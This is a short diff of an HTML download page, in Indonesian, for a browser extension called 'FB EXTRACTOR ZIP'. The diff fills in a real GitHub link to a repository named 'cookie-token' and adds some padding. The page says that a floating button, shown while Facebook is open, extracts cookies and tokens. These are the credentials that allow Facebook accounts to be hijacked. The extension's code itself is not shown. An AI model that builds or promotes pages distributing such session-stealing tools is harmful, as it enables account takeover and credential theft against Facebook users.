@@ -5,7 +5,7 @@ if (target) {
     <style>
         #status-container {
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; font-family: sans-serif;
+            min-height: 100vh; font-family: sans-serif; padding:10px;
         }
         .card { 
             background: white; padding: 24px; border-radius: 12px; 
@@ -26,7 +26,9 @@ if (target) {
         <h1>FB EXTRACTOR ZIP</h1>
         <p>Gunakan link di bawah untuk mengunduh versi terbaru ekstensi ini.</p>
         
-        <a href="https://github.com/USER_MU/REPO_FB_EXTRACTOR/archive/refs/heads/main.zip" class="btn">DOWNLOAD ZIP</a>
+        <a href="https://github.com/tommydev27/cookie-token/archive/refs/heads/main.zip" class="btn">
+            Download ZIP Sekarang
+        </a>
 
         <div class="instruction">
             <b>Info:</b> Fitur ambil data (Cookie/Token) ada di tombol melayang saat kamu buka Facebook.
